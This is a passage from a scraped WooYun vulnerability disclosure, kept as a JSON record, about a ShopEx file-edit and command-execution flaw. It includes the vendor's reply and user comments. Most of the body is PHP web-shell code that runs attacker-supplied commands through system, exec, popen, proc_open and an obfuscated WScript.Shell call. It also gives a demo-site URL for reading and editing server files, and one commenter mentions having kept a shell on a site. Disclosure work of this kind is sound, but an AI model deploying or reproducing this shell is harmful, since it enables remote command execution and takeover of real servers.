action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"POST\\\">\\n\";\t\t$tb->tdbody('无回显运行程序 → 文件: '.$tb->makeinput('program',$program).' 参数: '.$tb->makeinput('prog',$prog,'','text','40').' '.$tb->makeinput('','Run','','submit'),'center','2','35');\t\t$tb->makehidden('do','programrun');\t\techo \"\".$copyurl.$serveru.\"&p=\".$serverp.$copyurll.\"</form>\\n\";\t} echo \"<form action=\\\"?action=shell&dir=\".urlencode($dir).\"\\\" method=\\\"POST\\\">\\n\"; if(isset($_POST['cmd'])) $cmd = $_POST['cmd'];\t$tb->tdbody('提示:如果输出结果不完全,建议把输出结果写入文件.这样可以得到全部内容. ');\t$tb->tdbody('proc_open函数假设不是默认的winnt系统请自行设置使用,自行修改记得写退出,否则会在主机上留下一个未结束的进程.');\t$tb->tdbody('proc_open函数要使用的cmd程序的位置:'.$tb->makeinput('cmd',$cmd,'','text','30').'(要是是linux系统还是大大们自己修改吧)');   $execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','wscript'=>'Wscript.Shell','proc_open'=>'proc_open') : array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','proc_open'=>'proc_open');   $tb->tdbody('选择执行函数: '.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs,'selected'=>$execfunc)).' 输入命令: '.$tb->makeinput('command',$_POST['command'],'','text','60').' '.$tb->makeinput('','Run','','submit'));?>  <tr class=\"secondalt\">    <td align=\"center\"><textarea name=\"textarea\" cols=\"100\" rows=\"25\" readonly><?php\tif (!empty($_POST['command'])) {\t\tif ($execfunc==\"system\") {\t\t\tsystem($_POST['command']);\t\t} elseif ($execfunc==\"passthru\") {\t\t\tpassthru($_POST['command']);\t\t} elseif ($execfunc==\"exec\") {\t\t\t$result = exec($_POST['command']);\t\t\techo $result;\t\t} elseif ($execfunc==\"shell_exec\") {\t\t\t$result=shell_exec($_POST['command']);\t\t\techo $result;\t\t\t} elseif ($execfunc==\"popen\") {\t\t\t$pp = popen($_POST['command'], 'r');\t\t\t$read = fread($pp, 2096);\t\t\techo $read;\t\t\tpclose($pp);\t\t} elseif ($execfunc==\"wscript\") {\t\t\t$wsh = new COM('W'.'Scr'.'ip'.'t.she'.'ll') or die(\"PHP Create COM WSHSHELL failed\");\t\t\t$exec = $wsh->exec (\"cm\".\"d.e\".\"xe /c \".$_POST['command'].\"\");\t\t\t$stdout = $exec->StdOut();\t\t\t$stroutput = $stdout->ReadAll();\t\t\techo $stroutput;\t\t} elseif($execfunc==\"proc_open\"){$descriptorspec = array(   0 => array(\"pipe\", \"r\"),   1 => array(\"pipe\", \"w\"),   2 => array(\"pipe\", \"w\"));$process = proc_open(\"\".$_POST['cmd'].\"\", $descriptorspec, $pipes);if (is_resource($process)) {    // 写命令    fwrite($pipes[0], \"\".$_POST['command'].\"\\r\\n\");    fwrite($pipes[0], \"exit\\r\\n\");    fclose($pipes[0]);    // 读取输出    while (!feof($pipes[1])) {        echo fgets($pipes[1], 1024);    }    fclose($pipes[1]);    while (!feof($pipes[2])) {        echo fgets($pipes[2], 1024);      }    fclose($pipes[2]);    proc_close($process);}\t\t} else {\t\t\tsystem($_POST['command']);\t\t}\t}?>\n在编辑文件的部分可以得到地址形式如下\n$_POST['do'] == 'doeditfile'\n查看本地shopex文件，构造如下地址：http://demo.shopex.com.cn/485app/sql.php?action=editfile&dir=.%2F%2Fcore%2Finclude_v5&editfile=setmgr.php顺利读取并可编辑保存。   漏洞证明：  \n\n   修复方案：  权限，还是权限。。。   版权声明：转载请注明来源 lucifer@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2012-12-03 22:30 厂商回复： 非常感谢您为shopex信息安全做的贡献我们将尽快修复非常感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-12-03 13:35 |    \t\tEl4pse \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:7        | 世界上从来没有不可能这几个字，可不可能完...)\t\t \n  貌似之前就有这漏洞吧    \n     2012-12-03 13:54 |    \t\tlucifer \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:6        | 游荡在世界的每个角落，一个人。)\t\t \n  利用方法不同，你可以对照一下    \n     2012-12-04 09:37 |    \t\t漏洞不是用来公开的 \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:3        | 心存迷惑的话谁都会丧失斗志失去力量)\t\t \n  @lucifer 你谁啊，没事瞎报什么漏洞啊？就显你能是不是？    \n     2012-12-04 09:39 |    \t\t漏洞不是用来公开的 \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:3        | 心存迷惑的话谁都会丧失斗志失去力量)\t\t \n  都别关注这破洞了，模板编辑那点点杠能遍历整个盘符    \n     2012-12-04 09:47 |    \t\tleehenwu \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:24        | 撸·啊·撸)\t\t \n  貌似早就有了吧    \n     2012-12-04 11:57 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  @xsser    \n     2012-12-04 11:59 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @horseluke 貌似不一样吧 而且的确在官方测试成功得    \n     2012-12-05 21:48 |    \t\tlucifer \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:6        | 游荡在世界的每个角落，一个人。)\t\t \n  @漏洞不是用来公开的你能好好说话？自己去试试再来说好么？能遍历个毛啊，几百年前就修复了。真服了。什么人    \n     2012-12-05 21:49 |    \t\tlucifer \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:6        | 游荡在世界的每个角落，一个人。)\t\t \n  @leehenwu 大哥们，真心拜托你们按照以前的方法测试下，然后再来评论ok？    \n     2013-01-17 12:16 |    \t\t小猪 \t\t\t( 实习白帽子  |\t\t\t        Rank:80 漏洞数:10        )\t\t \n  phpMyAdmin------------1  这目录还在不。。。你这一爆害我的shell也掉了。。。。。    \n     2013-05-04 15:31 |    \t\t少校 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:5        | 别开枪，自己人！)\t\t \n  好文章，好思路！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}